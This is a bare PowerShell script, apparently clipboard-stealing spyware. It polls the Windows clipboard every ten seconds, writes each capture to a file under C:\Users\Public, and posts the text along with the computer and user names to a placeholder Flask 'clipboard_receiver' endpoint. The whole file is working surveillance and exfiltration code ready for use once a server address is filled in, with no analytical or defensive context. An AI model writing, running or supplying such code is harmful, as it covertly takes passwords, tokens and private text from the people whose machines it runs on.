Add-Type -AssemblyName System.Windows.Forms
$webhook_url = "http://<Your Flask Server IP>:5000/clipboard_receiver"

while ($true) {
    $clipText = [System.Windows.Forms.Clipboard]::GetText()

    if ($clipText) {
        Add-Content -Path "C:\Users\Public\clipboard_log.txt" -Value "Clipboard: $clipText"
        
        $postParams = @{
            clipboard_data = $clipText
            machine_name = $env:COMPUTERNAME
            user_name = $env:USERNAME
        }

        try {
            Invoke-RestMethod -Uri $webhook_url -Method Post -Body $postParams
        } catch {
            Write-Host "Failed to send data: $_"
        }
    }

    Start-Sleep -Seconds 10
}
